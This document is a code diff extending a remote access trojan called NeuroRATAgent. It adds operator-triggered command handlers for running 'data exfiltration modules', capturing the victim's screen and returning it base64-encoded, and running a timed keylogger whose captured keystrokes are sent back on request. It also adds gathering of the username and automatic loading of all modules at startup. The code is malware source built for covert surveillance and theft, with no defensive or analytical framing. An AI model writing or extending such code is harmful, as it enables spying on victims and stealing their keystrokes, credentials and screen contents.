@@ -99,7 +99,18 @@ class NeuroRATAgent:
         
         # Modules storage
         self.modules = {}
-
+        
+        # Initialize module loader if available
+        self.module_loader = None
+        try:
+            from agent_modules.module_loader import ModuleLoader
+            self.module_loader = ModuleLoader(
+                output_dir=os.path.join(os.getcwd(), "extracted_data")
+            )
+            logger.info("Module loader initialized successfully")
+        except ImportError:
+            logger.warning("Module loader not available")
+        
         # LLM processing capability
         self.llm_processor = None
         try:
@@ -118,6 +129,18 @@ class NeuroRATAgent:
         """Register custom command handlers for the agent."""
         # Override the LLM query handler
         self.agent.command_handlers[CommandType.LLM_QUERY] = self._handle_llm_query
+        
+        # Add handlers for new command types if they exist
+        try:
+            # Check if these command types exist in the protocol
+            if hasattr(CommandType, "RUN_MODULE"):
+                self.agent.command_handlers[CommandType.RUN_MODULE] = self._handle_run_module
+            if hasattr(CommandType, "CAPTURE_SCREEN"):
+                self.agent.command_handlers[CommandType.CAPTURE_SCREEN] = self._handle_capture_screen
+            if hasattr(CommandType, "KEYLOGGER"):
+                self.agent.command_handlers[CommandType.KEYLOGGER] = self._handle_keylogger
+        except Exception as e:
+            logger.error(f"Error registering custom command handlers: {str(e)}")
     
     def _collect_system_info(self) -> Dict[str, Any]:
         """Collect detailed system information."""
@@ -128,7 +151,7 @@ class NeuroRATAgent:
             "architecture": platform.machine(),
             "processor": platform.processor(),
             "hostname": socket.gethostname(),
-            "username": os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER') or os.getenv('USERNAME'),
+            "username": self._get_username_safely(),
             "python_version": platform.python_version(),
             "network": self._get_network_info(),
             "timestamp": time.time()
@@ -143,6 +166,30 @@ class NeuroRATAgent:
             info.update(self._get_mac_info())
         
         return info
+    
+    def _get_username_safely(self) -> str:
+        """Safely get the username without causing errors in containers."""
+        # Try different methods to get the username
+        try:
+            return os.getlogin()
+        except:
+            pass
+        
+        # Try environment variables
+        for env_var in ['USER', 'USERNAME', 'LOGNAME']:
+            username = os.getenv(env_var)
+            if username:
+                return username
+        
+        # Try pwd module on Unix-like systems
+        try:
+            import pwd
+            return pwd.getpwuid(os.getuid()).pw_name
+        except:
+            pass
+        
+        # If all else fails
+        return "unknown_user"
     
     def _get_network_info(self) -> Dict[str, Any]:
         """Get network information."""
@@ -590,12 +637,241 @@ WantedBy=default.target
         
         return {"users": users}
     
+    def _handle_run_module(self, command: Command) -> Response:
+        """Handle running a specific module."""
+        if not self.module_loader:
+            return Response(
+                command_id=command.command_id,
+                success=False,
+                data={},
+                message="Module loader not available"
+            )
+        
+        try:
+            module_name = command.data.get("module", "")
+            if not module_name:
+                # Run all modules if no specific module is requested
+                results = self.module_loader.run_all_modules()
+                return Response(
+                    command_id=command.command_id,
+                    success=True,
+                    data={"results": results}
+                )
+            else:
+                # Run a specific module
+                result = self.module_loader.run_module(module_name)
+                return Response(
+                    command_id=command.command_id,
+                    success=result.get("status") != "error",
+                    data={"result": result},
+                    message=result.get("message", "")
+                )
+        except Exception as e:
+            logger.error(f"Error running module: {str(e)}")
+            return Response(
+                command_id=command.command_id,
+                success=False,
+                data={},
+                message=f"Error running module: {str(e)}"
+            )
+    
+    def _handle_capture_screen(self, command: Command) -> Response:
+        """Handle screen capture request."""
+        try:
+            # Try to use the screen_capture module
+            from agent_modules import screen_capture
+            
+            # Create temporary directory for screenshots
+            temp_dir = tempfile.mkdtemp()
+            
+            # Create screen capture instance
+            screen_capturer = screen_capture.ScreenCapturer(output_dir=temp_dir)
+            
+            # Take screenshot
+            result = screen_capturer.run()
+            
+            if result.get("status") == "success" and "screenshot_path" in result:
+                # Read screenshot data
+                with open(result["screenshot_path"], "rb") as f:
+                    screenshot_data = f.read()
+                
+                # Convert to base64
+                screenshot_b64 = base64.b64encode(screenshot_data).decode("utf-8")
+                
+                return Response(
+                    command_id=command.command_id,
+                    success=True,
+                    data={
+                        "screenshot": screenshot_b64,
+                        "format": "png",
+                        "timestamp": time.time()
+                    }
+                )
+            else:
+                return Response(
+                    command_id=command.command_id,
+                    success=False,
+                    data={},
+                    message=f"Screen capture failed: {result.get('message', 'Unknown error')}"
+                )
+        except ImportError:
+            logger.error("Screen capture module not available")
+            return Response(
+                command_id=command.command_id,
+                success=False,
+                data={},
+                message="Screen capture module not available"
+            )
+        except Exception as e:
+            logger.error(f"Error capturing screen: {str(e)}")
+            return Response(
+                command_id=command.command_id,
+                success=False,
+                data={},
+                message=f"Error capturing screen: {str(e)}"
+            )
+    
+    def _handle_keylogger(self, command: Command) -> Response:
+        """Handle keylogger start/stop requests."""
+        try:
+            action = command.data.get("action", "")
+            duration = command.data.get("duration", 60)  # Default 60 seconds
+            
+            from agent_modules import keylogger
+            
+            if action == "start":
+                # Create temporary file for keylogger output
+                temp_file = tempfile.mktemp(suffix=".txt")
+                
+                # Start keylogger in a separate thread
+                self.keylogger_thread = threading.Thread(
+                    target=self._run_keylogger,
+                    args=(temp_file, duration)
+                )
+                self.keylogger_thread.daemon = True
+                self.keylogger_thread.start()
+                
+                return Response(
+                    command_id=command.command_id,
+                    success=True,
+                    data={"status": "started", "duration": duration},
+                    message=f"Keylogger started for {duration} seconds"
+                )
+            elif action == "stop":
+                # Stop is handled by the thread timeout, just acknowledge
+                return Response(
+                    command_id=command.command_id,
+                    success=True,
+                    data={"status": "stopped"},
+                    message="Keylogger stop command acknowledged"
+                )
+            elif action == "get":
+                # Return any collected data if available
+                if hasattr(self, "keylogger_result") and self.keylogger_result:
+                    return Response(
+                        command_id=command.command_id,
+                        success=True,
+                        data=self.keylogger_result
+                    )
+                else:
+                    return Response(
+                        command_id=command.command_id,
+                        success=False,
+                        data={},
+                        message="No keylogger data available"
+                    )
+            else:
+                return Response(
+                    command_id=command.command_id,
+                    success=False,
+                    data={},
+                    message=f"Unknown keylogger action: {action}"
+                )
+        except ImportError:
+            logger.error("Keylogger module not available")
+            return Response(
+                command_id=command.command_id,
+                success=False,
+                data={},
+                message="Keylogger module not available"
+            )
+        except Exception as e:
+            logger.error(f"Error handling keylogger request: {str(e)}")
+            return Response(
+                command_id=command.command_id,
+                success=False,
+                data={},
+                message=f"Error handling keylogger request: {str(e)}"
+            )
+    
+    def _run_keylogger(self, output_file: str, duration: int):
+        """Run keylogger in a separate thread for the specified duration."""
+        try:
+            from agent_modules import keylogger
+            
+            # Initialize keylogger
+            logger.info(f"Starting keylogger for {duration} seconds")
+            kl = keylogger.Keylogger(output_file=output_file)
+            
+            # Run keylogger for specified duration
+            kl.start()
+            time.sleep(duration)
+            kl.stop()
+            
+            # Read collected data
+            try:
+                with open(output_file, "r") as f:
+                    keylog_data = f.read()
+                
+                self.keylogger_result = {
+                    "data": keylog_data,
+                    "timestamp": time.time(),
+                    "duration": duration
+                }
+                
+                logger.info(f"Keylogger finished, collected {len(keylog_data)} bytes")
+            except Exception as e:
+                logger.error(f"Error reading keylogger data: {str(e)}")
+                self.keylogger_result = {
+                    "error": str(e),
+                    "timestamp": time.time()
+                }
+        except Exception as e:
+            logger.error(f"Error running keylogger: {str(e)}")
+            self.keylogger_result = {
+                "error": str(e),
+                "timestamp": time.time()
+            }
+    
+    def load_and_run_all_modules(self) -> Dict[str, Any]:
+        """
+        Load and run all available data exfiltration modules.
+        Returns a dictionary with the results.
+        """
+        if not self.module_loader:
+            logger.error("Module loader not available")
+            return {"status": "error", "message": "Module loader not available"}
+        
+        try:
+            logger.info("Loading and running all modules")
+            results = self.module_loader.run_all_modules()
+            logger.info(f"All modules executed, results: {results}")
+            return results
+        except Exception as e:
+            logger.error(f"Error running all modules: {str(e)}")
+            return {"status": "error", "message": str(e)}
+    
     def start(self):
         """Start the agent and connect to the server."""
         logger.info(f"Starting NeuroRAT agent with ID: {self.agent_id}")
         
         # Start the agent protocol agent
         self.agent.start()
+        
+        # Optionally load modules
+        if self.module_loader:
+            self.module_loader.load_all_modules()
+            logger.info("All modules loaded successfully")
         
         logger.info("Agent started successfully")
     
